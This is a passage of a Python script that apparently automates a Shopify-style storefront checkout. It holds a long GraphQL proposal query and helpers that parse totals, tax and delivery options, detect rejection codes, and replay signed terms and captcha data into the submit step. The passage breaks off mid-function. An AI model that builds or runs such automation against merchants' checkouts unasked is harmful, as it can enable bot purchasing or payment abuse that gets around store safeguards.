__typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}"""


# ==============================================================================
#  CHECKOUT HELPERS
# ==============================================================================

def _extract_tax_amount(tax):
    if not tax or not isinstance(tax, dict):
        return None
    if tax.get("__typename") != "FilledTaxTerms":
        return None
    raw = ((tax.get("totalTaxAmountV2") or {}).get("amount")
           or ((tax.get("totalTaxAmount") or {}).get("value") or {}).get("amount"))
    try:
        return float(raw)
    except (TypeError, ValueError):
        return None


def _tax_input(amount, currency, prefer_any=False):
    proposed = ({"any": True} if (prefer_any or amount is None)
                else {"value": {"amount": f"{float(amount):.2f}", "currencyCode": currency}})
    return {
        "proposedAllocations": None,
        "proposedTotalAmount": proposed,
        "proposedTotalIncludedAmount": None,
        "proposedMixedStateTotalAmount": None,
        "proposedExemptions": [],
    }


def _apply_seller_money(seller, totals):
    if not seller or not isinstance(seller, dict):
        return None, None
    rt = ((seller.get("runningTotal") or {}).get("value") or {}).get("amount")
    if rt is not None:
        totals["running_total"] = rt
        if not ((seller.get("checkoutTotal") or {}).get("value") or {}).get("amount"):
            totals["total_price"] = rt
    ct = ((seller.get("checkoutTotal") or {}).get("value") or {}).get("amount")
    if ct is not None:
        totals["total_price"] = ct
    else:
        tt = ((seller.get("total") or {}).get("value") or {}).get("amount")
        if tt is not None:
            totals["total_price"] = tt
    for src in (seller.get("checkoutTotal"), seller.get("runningTotal"), seller.get("total")):
        cur = ((src or {}).get("value") or {}).get("currencyCode")
        if cur:
            totals["currency"] = cur
            break
    nt = _extract_tax_amount(seller.get("tax") or {})
    if nt is not None:
        totals["tax_amount"] = float(nt)
    return _extract_tax_amount(seller.get("tax") or {}), (seller.get("tax") or {}).get("__typename")


def _apply_seller_delivery(seller, ship):
    if not seller or not isinstance(seller, dict):
        return
    d = seller.get("delivery") or {}
    if d.get("__typename") == "FilledDeliveryTerms":
        lines = d.get("deliveryLines") or []
        if lines:
            line = lines[0]
            sel = line.get("selectedDeliveryStrategy") or {}
            if isinstance(sel, dict) and sel.get("handle"):
                ship["delivery_strategy"] = sel["handle"]
            strats = line.get("availableDeliveryStrategies") or []
            if strats:
                chosen = None
                for s in strats:
                    if ship.get("delivery_strategy") and s.get("handle") == ship["delivery_strategy"]:
                        chosen = s
                        break
                if chosen is None:
                    chosen = strats[0]
                    if chosen.get("handle"):
                        ship["delivery_strategy"] = chosen["handle"]
                sa = ((chosen.get("amount") or {}).get("value") or {}).get("amount")
                if sa is not None:
                    try:
                        ship["shipping_amount"] = float(sa)
                    except (TypeError, ValueError):
                        pass
            tm = line.get("targetMerchandise") or {}
            mv2 = tm.get("linesV2") or []
            if mv2 and (mv2[0].get("merchandise") or {}).get("requiresShipping") is False:
                ship["requires_shipping"] = False
    de = seller.get("deliveryExpectations") or {}
    if de.get("__typename") == "FilledDeliveryExpectationTerms":
        for exp in de.get("deliveryExpectations") or []:
            if (exp.get("deliveryStrategyHandle") == ship.get("delivery_strategy")
                    and exp.get("signedHandle")):
                ship["signed_handle"] = exp["signedHandle"]
                break
        if not ship.get("signed_handle") and (de.get("deliveryExpectations") or []):
            ship["signed_handle"] = de["deliveryExpectations"][0].get("signedHandle")


def _delivery_strategy_input(requires_shipping, delivery_strategy, phone=None):
    if not requires_shipping:
        return None
    opts = {"options": {"phone": phone}} if phone else {"options": {}}
    if delivery_strategy:
        return {"deliveryStrategyByHandle":
                {"handle": delivery_strategy, "customDeliveryRate": False}, **opts}
    return {"deliveryStrategyMatchingConditions":
            {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, **opts}


def _reject_needs_accept(codes):
    for c in codes:
        if not isinstance(c, str):
            continue
        cu = c.upper()
        if (cu.startswith("DELIVERY_")
                or cu.startswith("PAYMENTS_PAYMENT_FLEXIBILITY")
                or "NEW_TAX" in cu
                or "TAX_TERMS" in cu
                or "MUST_BE_ACCEPTED" in cu
                or "DETAIL_CHANGED" in cu
                or cu in ("WAITING_PENDING_TERMS", "ORDER_TOTAL_CHANGED",
                          "PAYMENT_AMOUNT_CHANGED", "TERMS_CHANGED", "PROPOSAL_CHANGED")):
            return True
    return False

_ARTIFACT_CODES = (
    "REQUIRED_ARTIFACTS_UNAVAILABLE", "ARTIFACTS_UNAVAILABLE", "STALE_ARTIFACT",
    "SCRIPT_FINGERPRINT", "SIGNATURE_MISMATCH", "NON_NEGOTIABLE_TERMS",
    "CHECKPOINT_DATA_INVALID", "CHECKPOINT_EXPIRED", "QUEUE_TOKEN_INVALID",
)


def _needs_renagotiate(codes):
    for c in codes:
        cu = str(c).upper()
        if any(k in cu for k in _ARTIFACT_CODES):
            return True
    return False


def _capture_artifacts(seller, variables):
    """sellerProposal ke saare ARTIFACTS variables me daalo.
    Submit me inko echo karna zaroori hai, warna REQUIRED_ARTIFACTS_UNAVAILABLE."""
    if not isinstance(seller, dict):
        return

    nnt = seller.get("nonNegotiableTerms")
    if isinstance(nnt, dict) and nnt.get("signature"):
        variables["nonNegotiableTerms"] = {
            "signature": nnt.get("signature"),
            "contents": nnt.get("contents"),
        }

    cap = seller.get("captcha")
    if isinstance(cap, dict) and cap.get("__typename") == "Captcha":
        variables["captcha"] = {
